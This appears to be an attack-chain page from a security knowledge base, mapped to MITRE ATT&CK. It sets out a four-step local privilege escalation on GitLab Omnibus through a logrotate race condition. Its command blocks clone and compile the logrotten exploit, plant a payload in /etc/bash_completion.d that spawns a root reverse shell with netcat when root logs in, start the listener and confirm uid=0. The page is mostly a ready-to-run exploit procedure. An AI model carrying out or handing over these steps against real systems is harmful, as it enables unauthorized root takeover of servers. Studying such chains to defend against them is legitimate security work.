---
tags:
  - gitlab
  - logrotate
  - race-condition
  - privilege-escalation
  - lpe
  - linux
type: attack_chain
tools:
  - '[[tools/logrotten]]'
  - '[[tools/nc]]'
  - '[[tools/git]]'
  - '[[tools/gcc]]'
  - '[[tools/sudo]]'
tactics:
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Prepare-Environment-as-Git-User]]'
  - '[[procedures/Compile-and-Execute-Logrotten-Exploit]]'
  - '[[procedures/Deploy-Reverse-Shell-Payload]]'
  - '[[procedures/Capture-and-Verify-Root-Shell]]'
step_count: 4
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Abuse Elevation Control Mechanism]]'
updated_at: '2025-12-14T17:29:57.009Z'
description: >-
  A multi-stage attack exploiting a race condition in GitLab's logrotate
  configuration to escalate privileges from the local 'git' user to root,
  enabling arbitrary code execution.
skill_level: intermediate
impact_level: high
id: 8a77151b-d6f5-4e25-9f76-8e687b6bb07e
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Abuse Elevation Control Mechanism]]'
---
# GitLab Local Privilege Escalation via Logrotate Race Condition

Multi-stage attack chain demonstrating a complete local privilege escalation workflow in GitLab by exploiting a time-of-check-to-time-of-use (TOCTOU) race condition in logrotate.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Environment] --> B[Exploit Race Condition]
    B --> C[Deploy Payload]
    C --> D[Capture Root Shell]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/git]]
- [[tools/gcc]]
- [[tools/logrotten]]
- [[tools/nc]]
- [[tools/sudo]]

### Target Environment

- Linux OS with GitLab Omnibus installation
- Local access as 'git' system user
- Services: GitLab Rails, GitLab Workhorse, logrotate
- Tech stack: Ruby, PostgreSQL, Redis, Git, logrotate

### Initial Access Requirements

- Non-root shell access (e.g., as a low-privilege user with sudo to git)
- No network access required beyond local cloning from GitHub
- GitLab logs writable by 'git' user in /var/log/gitlab/

## Detailed Attack Procedures

### Step 1: Prepare Environment

procedure: [[procedures/Prepare-Environment-as-Git-User]]

**Objective**: Set up the necessary packages and switch to the vulnerable 'git' user to simulate local access.

**Instructions**: Install required dependencies using [[commands/apt-get-install-packages]] and switch users with [[commands/sudo-switch-to-git]]:

```bash
apt-get install sudo git build-essential
sudo -u git /bin/bash
```

**Expected Output**: Packages installed and bash prompt as git user.

**Success Indicators**:
- 'git' user shell active (prompt shows git@hostname)
- gcc and git available

### Step 2: Compile Exploit Tool

procedure: [[procedures/Compile-and-Execute-Logrotten-Exploit]]

**Objective**: Download and build the logrotten tool to exploit the logrotate race condition.

**Instructions**: Clone the repository with [[commands/git-clone-logrotten]] and compile using [[commands/gcc-compile-logrotten]]:

```bash
git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten
cd /tmp/logrotten && gcc -o logrotten logrotten.c
```

Create a dummy log file with [[commands/echo-create-dummy-log]]:

```bash
echo "hello gitlab" > /var/log/gitlab/gitlab-workhorse/something.log
```

Run the exploit with [[commands/logrotten-execute]]:

```bash
./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log
```

**Expected Output**: Logrotten waits for rotation, renames directory, creates symlink to /etc/bash_completion.d, and reports 'Done!'.

**Success Indicators**:
- Symlink created in target directory
- No errors during compilation or execution

### Step 3: Deploy Payload

procedure: [[procedures/Deploy-Reverse-Shell-Payload]]

**Objective**: Place a malicious script in the symlinked location to execute as root during login.

**Instructions**: Write the payload script using [[commands/echo-deploy-payload]]:

```bash
echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz
```

Start listener with [[commands/nc-listen]]:

```bash
nc -nvlp 3333
```

**Expected Output**: File written successfully; listener shows 'listening on [any] 3333 ...'.

**Success Indicators**:
- Payload file exists in /etc/bash_completion.d/
- Netcat listener active on port 3333

### Step 4: Trigger and Verify Access

procedure: [[procedures/Capture-and-Verify-Root-Shell]]

**Objective**: Trigger the payload by root login and capture the reverse shell to confirm escalation.

**Instructions**: Simulate root login (e.g., via SSH as root) to execute the bash completion script. In the listener shell, verify with [[commands/id-verify-root]] and [[commands/ls-explore]]:

```bash
id
ls -la
```

Optionally, check GitLab env with [[commands/gitlab-rake-env]]:

```bash
gitlab-rake gitlab:env:info
```

**Expected Output**: 'uid=0(root) gid=0(root)', detailed file listing, and GitLab environment details.

**Success Indicators**:
- Incoming connection from root shell
- id command confirms uid=0
- Arbitrary root commands executable

## Attack Chain Summary

### Key Achievements

1. Gained local access as 'git' user and prepared exploit environment
2. Exploited logrotate race to symlink sensitive directory
3. Deployed root-executable payload for reverse shell
4. Achieved full root privilege escalation upon root login

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[Abuse Elevation Control Mechanism]] Abuse Elevation Control Mechanism

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation

---

*Last updated: 2023-10-01T00:00:00Z*
